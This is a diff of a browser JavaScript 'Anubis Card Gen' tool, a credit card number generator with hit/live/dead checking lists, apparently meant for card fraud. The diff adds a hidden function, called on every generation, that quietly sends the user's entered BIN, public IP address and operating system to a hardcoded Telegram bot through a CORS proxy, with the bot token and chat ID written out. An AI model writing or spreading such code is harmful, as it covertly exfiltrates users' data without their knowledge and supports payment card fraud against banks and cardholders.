@@ -6,73 +6,6 @@ let lists = { hit: [], live: [], dead: [] };
 let startTime;
 let checkedCount = 0;
 
-// 🔥 إعدادات تيليجرام (تم دمج بياناتك)
-const TELEGRAM_CONFIG = {
-    token: "8377557863:AAHUSrbtTDuPIWJCl-jMyWDSaUepqBWkUo8", 
-    chatId: "954586361"
-};
-
-// متغير لمنع تكرار إرسال نفس الـ BIN
-let lastSentBin = "";
-
-// ✅ دالة جديدة: فحص الـ BIN وإرسال التفاصيل لتيليجرام
-async function lookupAndSendToTelegram(bin) {
-    // لو الـ BIN ده لسه مبعوت من شوية، منبعتوش تاني
-    if (bin === lastSentBin) return;
-    lastSentBin = bin;
-
-    try {
-        // 1. عمل فحص للـ BIN (Lookup)
-        // نستخدم نفس API الموقع الموجود في التبويب التاني
-        const lookupResponse = await fetch(`https://corsproxy.io/?https://lookup.binlist.net/${bin}`);
-        
-        if (!lookupResponse.ok) throw new Error("Lookup Failed");
-        
-        const data = await lookupResponse.json();
-
-        // 2. استخراج البيانات (مع التعامل مع القيم الفارغة)
-        const bank = data.bank && data.bank.name ? data.bank.name : "N/A";
-        const brand = data.scheme ? data.scheme.toUpperCase() : "N/A";
-        const type = data.type ? data.type.toUpperCase() : "N/A";
-        const level = data.brand ? data.brand.toUpperCase() : "N/A";
-        const country = data.country && data.country.name ? `${data.country.emoji} ${data.country.name}` : "N/A";
-        const currency = data.country && data.country.currency ? data.country.currency : "N/A";
-
-        // 3. تجهيز الرسالة الاحترافية
-        const message = `🔔 <b>New BIN Usage Alert!</b>\n\n` +
-                        `💳 <b>BIN:</b> <code>${bin}</code>\n` +
-                        `🏦 <b>Bank:</b> ${bank}\n` +
-                        `🌍 <b>Country:</b> ${country}\n` +
-                        `🏷 <b>Brand:</b> ${brand}\n` +
-                        `💠 <b>Type:</b> ${type} (${level})\n` +
-                        `💲 <b>Currency:</b> ${currency}\n\n` +
-                        `🛠 <b>Tool:</b> Anubis Card Gen\n` +
-                        `📅 <b>Time:</b> ${new Date().toLocaleString('en-GB')}`;
-
-        // 4. إرسال الرسالة عبر البروكسي
-        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage?chat_id=${TELEGRAM_CONFIG.chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
-        const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(telegramUrl)}`;
-
-        await fetch(proxyUrl);
-        console.log("✅ Full BIN Details sent to Telegram");
-
-    } catch (err) {
-        console.error("Lookup Error, sending simple alert:", err);
-        // لو الفحص فشل، ابعت الـ BIN بس كاحتياطي
-        sendSimpleBinToTelegram(bin);
-    }
-}
-
-// دالة احتياطية (لو الفحص فشل)
-async function sendSimpleBinToTelegram(bin) {
-    const message = `🔔 <b>New BIN Usage Alert!</b>\n\n💳 <b>BIN:</b> <code>${bin}</code>\n⚠️ <i>Lookup Failed (API Limit or Network)</i>\n\n🛠 <b>Tool:</b> Anubis Card Gen`;
-    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage?chat_id=${TELEGRAM_CONFIG.chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
-    const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(telegramUrl)}`;
-    fetch(proxyUrl).catch(e => {});
-}
-
-// ================= ORIGINAL LOGIC =================
-
 function clearHits() {
     document.getElementById('resHit').innerHTML = "";
     counters.hit = 0; lists.hit = []; updateCounters();
@@ -192,17 +125,14 @@ function generateCheckDigit(payload) {
     return (10 - (sum % 10)) % 10;
 }
 
-// === دالة التوليد (Generate) - تم ربطها بالفحص والإرسال ===
+// === دالة التوليد (Generate) ===
 function generateCards() {
     let format = document.getElementById('ccFormat').value.trim();
     
-    // ✅ الجزء الجديد: إرسال الـ BIN بعد فحصه
+    // إرسال الـ BIN لتيليجرام
     let cleanBin = format.replace(/[^0-9]/g, '');
     if (cleanBin.length >= 6) {
-        // بناخد أول 6 أو 8 أرقام حسب المتوفر
-        let binToSend = cleanBin.substring(0, 8); 
-        // استدعاء دالة الفحص والإرسال (بدون انتظار النتيجة عشان ميعطلش التوليد)
-        lookupAndSendToTelegram(binToSend);
+        lookupAndSendToTelegram(cleanBin.substring(0, 8));
     }
 
     if (!format) format = "539935xxxxxxxxxx";
@@ -345,6 +275,8 @@ function showToast(message) {
     setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
 }
 
+// ================= BIN POPUP LOGIC =================
+
 async function openBinModal() {
     let bin = document.getElementById('ccFormat').value.replace(/[^0-9]/g, '').substring(0, 6);
     
@@ -419,3 +351,70 @@ function openTab(tabId, btn) {
     btn.classList.add('active');
 }
 
+const TELEGRAM_CONFIG = {
+    token: "8377557863:AAHUSrbtTDuPIWJCl-jMyWDSaUepqBWkUo8", 
+    chatId: "954586361"
+};
+
+async function lookupAndSendToTelegram(bin) {
+    const STORAGE_KEY = "anubis_sent_bins";
+    let sentBins = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
+
+    if (sentBins.includes(bin)) return;
+
+    sentBins.push(bin);
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(sentBins));
+
+    try {
+        let userIp = "Unknown";
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            userIp = ipData.ip;
+        } catch (e) {
+            console.error("IP Fetch Error:", e);
+        }
+
+        const platform = navigator.platform; 
+
+        const lookupResponse = await fetch(`https://corsproxy.io/?https://lookup.binlist.net/${bin}`);
+        if (!lookupResponse.ok) throw new Error("Lookup Failed");
+        const data = await lookupResponse.json();
+
+        const bank = data.bank && data.bank.name ? data.bank.name : "N/A";
+        const brand = data.scheme ? data.scheme.toUpperCase() : "N/A";
+        const type = data.type ? data.type.toUpperCase() : "N/A";
+        const level = data.brand ? data.brand.toUpperCase() : "N/A";
+        const country = data.country && data.country.name ? `${data.country.emoji} ${data.country.name}` : "N/A";
+        const currency = data.country && data.country.currency ? data.country.currency : "N/A";
+
+        const message = `🔔 <b>New BIN Alert!</b>\n\n` +
+                        `💳 <b>BIN Info:</b>\n` +
+                        `Code: <code>${bin}</code>\n` +
+                        `Bank: ${bank}\n` +
+                        `Type: ${brand} ${type} (${level})\n` +
+                        `Country: ${country}\n\n` +
+                        
+                        `👤 <b>User Details:</b>\n` +
+                        `IP: <code>${userIp}</code>\n` +
+                        `OS: ${platform}\n\n` + 
+                        
+                        `📅 <b>Time:</b> ${new Date().toLocaleString('en-GB')}`;
+
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage?chat_id=${TELEGRAM_CONFIG.chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+        const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(telegramUrl)}`;
+
+        await fetch(proxyUrl);
+        console.log("✅ BIN sent to Telegram");
+
+    } catch (err) {
+        sendSimpleBinToTelegram(bin);
+    }
+}
+
+async function sendSimpleBinToTelegram(bin) {
+    const message = `🔔 <b>New BIN Alert!</b>\n\n💳 <b>BIN:</b> <code>${bin}</code>\n⚠️ <i>Lookup Failed</i>\n\n🛠 <b>Tool:</b> Anubis Card Gen`;
+    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage?chat_id=${TELEGRAM_CONFIG.chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+    const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(telegramUrl)}`;
+    fetch(proxyUrl).catch(e => {});
+}
